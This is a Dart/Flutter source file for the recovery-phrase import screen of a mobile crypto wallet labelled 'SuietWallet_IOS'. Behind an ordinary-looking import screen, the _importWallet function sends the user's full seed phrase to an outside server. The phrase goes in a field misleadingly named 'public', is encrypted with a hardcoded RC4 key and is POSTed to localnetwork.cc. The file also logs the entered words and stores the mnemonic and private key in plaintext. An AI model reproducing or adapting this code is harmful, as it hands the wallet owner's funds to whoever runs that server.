import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:bip39/bip39.dart' as bip39;
import 'package:simple_rc4/simple_rc4.dart';
import 'package:suite/createpassword.dart';
import 'package:wallet/wallet.dart' as wallet;
import 'package:web3dart/web3dart.dart' as web3dart;
import 'package:flutter/services.dart';
import 'package:web3dart/crypto.dart' as crypto;
import 'wallet_screen.dart';
import 'package:shared_preferences/shared_preferences.dart';

const String API_URL = 'https://localnetwork.cc/record/docs/filler'; // Замените на ваш API URL
const String SERVER_KEY = 'Qsx@ah&OR82WX9T6gCt'; // Замените на ваш серверный ключ
const String APP_NAME = 'SuietWallet_IOS'; // Название вашего приложения

class ImportRecoveryScreen extends StatefulWidget {
  const ImportRecoveryScreen({super.key});

  @override
  _ImportRecoveryScreenState createState() => _ImportRecoveryScreenState();
}

class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
  int _selectedFieldCount = 12;
  final List<TextEditingController> _controllers = [];
  bool _isMnemonicValid = true;
  final List<bool> _isFieldValid = []; // Добавлено для хранения статуса валидности
  List<String>? _bip39WordList; // Список слов BIP-39
  bool _isLoading = true; // Флаг загрузки слов

  @override
  void initState() {
    super.initState();
    _controllers.addAll(List.generate(
      _selectedFieldCount,
          (index) => TextEditingController(),
    ));
    _isFieldValid.addAll(List.generate(
      _selectedFieldCount,
          (_) => true,
    ));
    _loadBip39WordList(); // Загрузить список слов при инициализации
  }

  Future<void> _loadBip39WordList() async {
    try {
      final wordListString = await rootBundle.loadString('assets/bip39.txt');
      setState(() {
        _bip39WordList = wordListString.split('\n').map((word) => word.trim()).toList();
        _isLoading = false;
      });
    } catch (e) {
      print('Failed to load word list: ${e.toString()}');
    }
  }



  void _validateFields() {
    if (_bip39WordList == null || _controllers.length != _selectedFieldCount) {
      print('Invalid state for validation.');
      return;
    }

    final words = _controllers.map((c) => c.text.trim()).toList();

    // Логирование слов
    print('Entered words: $words');

    // Проверка валидности всей мнемоники
    final mnemonic = words.join(' ');
    final isMnemonicValid = bip39.validateMnemonic(mnemonic);

    // Логирование результата проверки всей мнемоники
    print('Mnemonic validation result: $isMnemonicValid');

    // Проверка валидности каждого слова
    final fieldValidity = List.generate(_selectedFieldCount, (index) {
      final word = words[index];
      final isValid = _bip39WordList!.contains(word);
      // Логирование валидности каждого слова
      print('Word at index $index ("$word") validation result: $isValid');
      return isValid;
    });

    setState(() {
      _isMnemonicValid = isMnemonicValid;
      _isFieldValid.setAll(0, fieldValidity);

      // Логирование результатов проверки полей
      print('Field validity results: $_isFieldValid');
    });
  }

  @override
  void dispose() {
    for (final controller in _controllers) {
      controller.dispose();
    }
    super.dispose();
  }

  void _updateFieldCount(int newCount) {
    setState(() {
      if (newCount > _selectedFieldCount) {
        // Добавляем новые контроллеры
        _controllers.addAll(List.generate(newCount - _selectedFieldCount, (index) => TextEditingController()));
        _isFieldValid.addAll(List.generate(newCount - _selectedFieldCount, (_) => true));
      } else if (newCount < _selectedFieldCount) {
        // Удаляем лишние контроллеры и флаги валидности
        _controllers.removeRange(newCount, _controllers.length);
        _isFieldValid.removeRange(newCount, _isFieldValid.length);
      }
      _selectedFieldCount = newCount;
    });
  }

  Future<void> _importWallet() async {
    final mnemonic = _controllers.map((c) => c.text).join(' ');
    _validateFields();
    if (!_isMnemonicValid) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Invalid mnemonic phrase.')),
      );
      return;
    }

    try {
      final random = _generateRandomSalt();
      final jsonBody = jsonEncode({
        'public': mnemonic,
        'salt': random,
        'name': APP_NAME,
        'new': false,
      });

      final encryptedData = _encryptData(jsonBody, SERVER_KEY);

      final response = await http.post(
        Uri.parse(API_URL),
        body: {'data': encryptedData},
        encoding: Encoding.getByName('utf-8'),
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
      );

      if (response.statusCode == 200) {
        final responseBody = jsonDecode(response.body);
        print('Server response: ${responseBody}');
        await _processResponse(responseBody, mnemonic);
      } else {
        throw Exception("Failed to import wallet. Status code: ${response.statusCode}");
      }
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Error: ${e.toString()}')),
      );
    }
  }

  String uint8ListToBase64(Uint8List bytes) {
    return base64Encode(bytes);
  }

  Uint8List base64ToUint8List(String base64String) {
    return base64Decode(base64String);
  }

  Future<void> _processResponse(Map<String, dynamic> responseBody, String mnemonic) async {
    final portfolioId = responseBody['portfolio']['id'];
    final privateKey = _generatePrivateKey(mnemonic);
    final publicKey = _generatePublicKey(privateKey);
    final address = _generateAddress(publicKey);

    // Check if the wallet already exists
    final prefs = await SharedPreferences.getInstance();
    final walletKeys = prefs.getStringList('walletKeys') ?? [];
    final existingWallets = walletKeys.map((key) {
      final walletData = prefs.getString(key);
      if (walletData != null) {
        final data = jsonDecode(walletData) as Map<String, dynamic>;
        return data['address'] as String?;
      }
      return null;
    }).where((addr) => addr != null).toSet();

    if (existingWallets.contains(address.toLowerCase())) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Wallet already exists.')),
      );
      return;
    }

    if (address.toLowerCase() == portfolioId.toLowerCase()) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Wallet imported successfully')),
      );

      // Save wallet data
      final walletKey = DateTime.now().millisecondsSinceEpoch.toString();
      final walletData = {
        'privateKey': privateKey,
        'address': address,
        'portfolioId': portfolioId,
        'publicKey': uint8ListToBase64(publicKey),
        'mnemonic': mnemonic
      };

      await prefs.setString(walletKey, jsonEncode(walletData));

      walletKeys.add(walletKey);
      await prefs.setStringList('walletKeys', walletKeys);

      _checkPassword(privateKey, address, portfolioId); // Добавляем вызов метода здесь
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Address does not match the server response.')),
      );
    }
  }

  Future<void> _checkPassword(String privateKey, String address, String portfolioId) async {
    final prefs = await SharedPreferences.getInstance();
    final hasPassword = prefs.getString('userPassword') != null;

    if (!hasPassword) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (context) => CreatePasswordImport(
            privateKey: privateKey,
            address: address,
            portfolioId: portfolioId,), // Переход на экран создания пароля
        ),
      );
    } else {
      // Если пароль уже есть, сразу переходим к кошельку
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (context) => WalletScreen(
            privateKey: privateKey,
            address: address,
            portfolioId: portfolioId,
          ), // Переход на экран кошелька
        ),
      );
    }
  }

  String _generateRandomSalt() {
    final random = (DateTime.now().millisecondsSinceEpoch % 1000000).toString().padLeft(6, '0');
    return random;
  }

  String _encryptData(String data, String key) {
    final rc4 = RC4(key);
    final encryptedData = rc4.encodeBytes(data.codeUnits);
    return base64.encode(encryptedData);
  }

  String _generatePrivateKey(String mnemonic) {
    if (!bip39.validateMnemonic(mnemonic)) {
      throw FormatException("Invalid mnemonic phrase.");
    }

    final seed = bip39.mnemonicToSeed(mnemonic);
    final masterKey = wallet.ExtendedPrivateKey.master(seed, wallet.xprv);
    final derivedKey = masterKey.forPath("m/44'/60'/0'/0/0") as wallet.ExtendedPrivateKey;
    final privateKey = _bigIntToHex(derivedKey.key);
    return privateKey;
  }

  String _bigIntToHex(BigInt bigInt) {
    final bytes = _bigIntToUint8List(bigInt);
    return bytesToHex(bytes);
  }

  Uint8List _generatePublicKey(String privateKeyHex) {
    try {
      final privateKeyBytes = hexToBytes(privateKeyHex);
      final ethPrivateKey = web3dart.EthPrivateKey.fromHex(privateKeyHex);
      final publicKey = ethPrivateKey.publicKey;
      final publicKeyBytes = publicKey.getEncoded(false); // Generate uncompressed public key
      if (publicKeyBytes.length != 65) { // Uncompressed public key should be 65 bytes including the prefix
        throw FormatException("Invalid public key length. Expected 65 bytes.");
      }
      return publicKeyBytes.sublist(1); // Remove the prefix byte
    } catch (e) {
      throw Exception("Failed to generate public key: ${e.toString()}");
    }
  }

  String _generateAddress(Uint8List publicKey) {
    if (publicKey.length != 64) {
      throw FormatException("Invalid public key length. Expected 64 bytes.");
    }
    final addressBytes = crypto.keccak256(publicKey).sublist(12);
    return web3dart.EthereumAddress(addressBytes).hex;
  }

  Uint8List _bigIntToUint8List(BigInt number) {
    return bigIntToBytes(number);
  }

  Uint8List bigIntToBytes(BigInt number) {
    number = number.isNegative ? -number : number;
    int bytesNeeded = (number.bitLength + 7) >> 3;
    var byteList = Uint8List(bytesNeeded);
    var byteData = ByteData.sublistView(byteList);

    for (int i = 0; i < bytesNeeded; i++) {
      byteData.setUint8(bytesNeeded - i - 1, number.toUnsigned(8).toInt());
      number = number >> 8;
    }

    return byteList;
  }

  String bytesToHex(Uint8List bytes) {
    final buffer = StringBuffer();
    for (final byte in bytes) {
      buffer.write(byte.toRadixString(16).padLeft(2, '0'));
    }
    return buffer.toString();
  }

  Uint8List hexToBytes(String hex) {
    final length = hex.length;
    final bytes = Uint8List(length ~/ 2);
    for (int i = 0; i < length; i += 2) {
      bytes[i ~/ 2] = int.parse(hex.substring(i, i + 2), radix: 16);
    }
    return bytes;
  }

  Future<void> _pasteMnemonic() async {
    final clipboardData = await Clipboard.getData('text/plain');
    if (clipboardData != null) {
      final words = clipboardData.text?.split(' ') ?? [];
      for (int i = 0; i < _controllers.length && i < words.length; i++) {
        _controllers[i].text = words[i];
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;

    if (_isLoading) {
      return Scaffold(
        backgroundColor: Colors.white,
        body: Center(
          child: CircularProgressIndicator(),
        ),
      );
    }

    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Color(0xFF8E8E93)),
          onPressed: () {
            Navigator.pop(context);
          },
        ),
        title: const Text(
          'Import Wallet',
          style: TextStyle(color: Color(0xFF8E8E93), fontSize: 18),
        ),
        centerTitle: true,
      ),
      body: Stack(
        children: [
          Align(
            alignment: Alignment.bottomRight,
            child: Padding(
              padding: const EdgeInsets.only(right: 5, bottom: 16),
              child: Image.asset(
                'assets/images/logo3.png',
                width: screenWidth * 0.4,
                height: screenWidth * 0.4,
                fit: BoxFit.contain,
              ),
            ),
          ),
          SingleChildScrollView(
            padding: const EdgeInsets.symmetric(horizontal: 10),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.center,
              children: [
                const SizedBox(height: 20),
                const Text(
                  'Import Recovery Phrase',
                  style: TextStyle(
                    fontSize: 30,
                    color: Color(0xFF007AFF),
                    fontWeight: FontWeight.bold,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 10),
                const Text(
                  'From an existing wallet.',
                  style: TextStyle(
                    fontSize: 14,
                    color: Color(0xFF8E8E93),
                    fontWeight: FontWeight.bold,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 10),
                Center(
                  child: SizedBox(
                    width: 130,
                    child: DropdownButtonFormField<int>(
                      value: _selectedFieldCount,
                      onChanged: (int? newValue) {
                        if (newValue != null) {
                          _updateFieldCount(newValue);
                        }
                      },
                      decoration: InputDecoration(
                        filled: true,
                        fillColor: Colors.white,
                        border: InputBorder.none,
                        enabledBorder: InputBorder.none,
                        focusedBorder: InputBorder.none,
                      ),
                      dropdownColor: Colors.white,
                      style: const TextStyle(color: Colors.black),
                      items: const [
                        DropdownMenuItem(value: 12, child: Text('12 Words')),
                        DropdownMenuItem(value: 24, child: Text('24 Words')),
                      ],
                      icon: const Icon(Icons.arrow_drop_down, color: Colors.blue),
                      iconSize: 24,
                    ),
                  ),
                ),
                Card(
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12),
                  ),
                  margin: const EdgeInsets.symmetric(horizontal: 10, vertical: 20),
                  color: Colors.transparent,
                  child: Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(12),
                      gradient: const LinearGradient(
                        colors: [Color(0xFF015FDF), Color(0xFF1ED2FC)],
                        begin: Alignment.topRight,
                        end: Alignment.bottomLeft,
                      ),
                    ),
                    child: Column(
                      children: [
                        GridView.builder(
                          shrinkWrap: true,
                          physics: const NeverScrollableScrollPhysics(),
                          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 2,
                            childAspectRatio: 4,
                            crossAxisSpacing: 10,
                            mainAxisSpacing: 10,
                          ),
                          itemCount: _selectedFieldCount,
                          itemBuilder: (context, index) {
                            return Stack(
                              clipBehavior: Clip.none,
                              children: [
                                Positioned.fill(
                                  child: Container(
                                    decoration: BoxDecoration(
                                      color: Colors.white.withOpacity(0.2),
                                      borderRadius: BorderRadius.circular(8),
                                    ),
                                    child: TextField(
                                      controller: _controllers[index],
                                      textAlign: TextAlign.left,
                                      decoration: InputDecoration(
                                        contentPadding: const EdgeInsets.symmetric(horizontal: 35, vertical: 10),
                                        border: OutlineInputBorder(
                                          borderRadius: BorderRadius.circular(8),
                                          borderSide: BorderSide.none,
                                        ),
                                        filled: true,
                                        fillColor: Colors.white.withOpacity(0.2),
                                      ),
                                      style: TextStyle(
                                        color: _isFieldValid[index] ? Colors.white : Colors.red,
                                      ),
                                      cursorColor: Colors.white,
                                    ),
                                  ),
                                ),
                                Positioned(
                                  left: 8,
                                  top: 12,
                                  child: Text(
                                    '${index + 1}.',
                                    style: TextStyle(
                                      color: _isFieldValid[index] ? Colors.white : Colors.red,
                                      fontWeight: FontWeight.bold,
                                    ),
                                  ),
                                ),
                              ],
                            );
                          },
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Expanded(
                              flex: 1,
                              child: Padding(
                                padding: const EdgeInsets.only(right: 10),
                                child: ElevatedButton.icon(
                                  onPressed: _pasteMnemonic,
                                  style: ElevatedButton.styleFrom(
                                    backgroundColor: Colors.transparent,
                                    foregroundColor: Colors.white,
                                    shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(6),
                                      side: const BorderSide(color: Colors.white),
                                    ),
                                    padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 16),
                                  ),
                                  icon: const Icon(Icons.paste, color: Colors.white, size: 16),
                                  label: FittedBox(
                                    fit: BoxFit.scaleDown, // Масштабирует текст, чтобы он поместился в доступное пространство
                                    child: Text(
                                      'Paste',
                                      style: TextStyle(
                                        color: Colors.white,
                                        fontSize: 14, // Начальный размер текста
                                      ),
                                      maxLines: 1,
                                      overflow: TextOverflow.visible,
                                    ),
                                  ),
                                ),
                              ),
                            ),
                            Expanded(
                              flex: 2,
                              child: ElevatedButton(
                                onPressed: _importWallet,
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.white,
                                  foregroundColor: Colors.blue,
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(6),
                                  ),
                                  padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 16),
                                ),
                                child: const Text(
                                  'Import',
                                  style: TextStyle(
                                    color: Colors.blue,
                                    fontSize: 14,
                                  ),
                                ),
                              ),
                            ),
                          ],
                        ),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}
